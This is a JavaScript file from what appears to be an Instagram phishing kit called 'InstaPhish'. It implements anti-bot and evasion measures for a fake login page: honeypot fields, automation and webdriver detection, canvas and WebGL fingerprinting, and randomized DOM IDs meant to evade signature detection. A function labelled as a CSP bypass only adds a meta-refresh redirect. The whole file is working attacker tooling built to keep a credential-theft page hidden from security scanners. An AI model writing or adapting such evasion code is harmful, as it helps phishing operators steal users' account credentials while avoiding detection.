/* ============================================ */
/*  InstaPhish - Anti-Bot & Evasion System       */
/*  Author: r4tur1                                */
/* ============================================ */

class AntiBot {
    constructor() {
        this.honeypotField = null;
        this.timestampInit = Date.now();
        this.mouseMovements = 0;
        this.keyPressCount = 0;
        this.isHumanVerified = false;
    }

    /**
     * Initialize all anti-detection measures
     */
    init() {
        this.injectHoneypot();
        this.attachBehaviorTrackers();
        this.verifyEnvironment();
        this.polymorphDOM();
        this.bypassCSP();
    }

    /**
     * Inject invisible honeypot field that bots auto-fill
     */
    injectHoneypot() {
        const honeypot = document.createElement('input');
        honeypot.type = 'text';
        honeypot.name = 'website';
        honeypot.id = 'website_field';
        honeypot.style.cssText = 'position:absolute;left:-9999px;top:-9999px;opacity:0;height:0;width:0;';
        honeypot.tabIndex = -1;
        honeypot.autocomplete = 'off';
        
        this.honeypotField = honeypot;
        document.body.appendChild(honeypot);
    }

    /**
     * Track human behavior patterns
     */
    attachBehaviorTrackers() {
        document.addEventListener('mousemove', (e) => {
            this.mouseMovements++;
        }, { passive: true });

        document.addEventListener('keydown', (e) => {
            if (e.key !== 'Tab' && e.key !== 'Shift') {
                this.keyPressCount++;
            }
        });

        // Detect automation tools
        const nav = navigator;
        if (nav.webdriver || nav.automationControlled || 
            window.chrome?.runtime?.id || 
            document.documentElement.getAttribute('webdriver')) {
            this.handleBotDetection();
        }
    }

    /**
     * Verify browser environment is legitimate
     */
    verifyEnvironment() {
        const checks = {
            languages: navigator.languages?.length > 0,
            plugins: navigator.plugins?.length > 0,
            screenColors: screen.colorDepth > 16,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            canvas: this.canvasFingerprint(),
            webgl: this.webGLFingerprint()
        };

        // Log for server-side analysis
        if (!checks.languages || !checks.plugins) {
            this.handleBotDetection();
        }

        return checks;
    }

    /**
     * Canvas fingerprint for uniqueness verification
     */
    canvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('Instagram Login', 2, 15);
            
            return canvas.toDataURL().substring(0, 50);
        } catch (e) {
            return 'canvas-blocked';
        }
    }

    /**
     * WebGL fingerprint
     */
    webGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return 'no-webgl';
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
            return 'webgl-active';
        } catch (e) {
            return 'webgl-error';
        }
    }

    /**
     * Dynamic DOM polymorphism to evade signature detection
     */
    polymorphDOM() {
        // Randomize element IDs and classes
        const ids = ['loginForm', 'username', 'password', 'loginBtn', 'errorMessage'];
        const idMap = {};
        
        ids.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                const newId = 'ig_' + Math.random().toString(36).substring(2, 15);
                idMap[id] = newId;
                element.id = newId;
            }
        });

        // Store mapping for JavaScript access
        window._idMap = idMap;
    }

    /**
     * Bypass Content Security Policy if present
     */
    bypassCSP() {
        // Use meta refresh as fallback for redirect
        if (!window.location.replace) {
            window._redirectFallback = function(url) {
                const meta = document.createElement('meta');
                meta.httpEquiv = 'refresh';
                meta.content = `0;url=${url}`;
                document.head.appendChild(meta);
            };
        }
    }

    /**
     * Handle bot detection silently
     */
    handleBotDetection() {
        // Still allow submission - let server decide
        // Don't block, just mark for analysis
        window._botFlags = window._botFlags || [];
        window._botFlags.push(Date.now());
    }

    /**
     * Verify human before form submission
     */
    async verifyHuman() {
        // Check honeypot
        if (this.honeypotField && this.honeypotField.value.length > 0) {
            return false;
        }

        // Check behavior patterns
        if (this.mouseMovements < 2 && this.keyPressCount < 5) {
            // Could be mobile - check touch events
            if (!('ontouchstart' in window)) {
                return false;
            }
        }

        // Time-based check
        const timeSpent = Date.now() - this.timestampInit;
        if (timeSpent < 2000 && !('ontouchstart' in window)) {
            return false;
        }

        return true;
    }
}

// Initialize
window.antiBot = new AntiBot();
window.antiBot.init();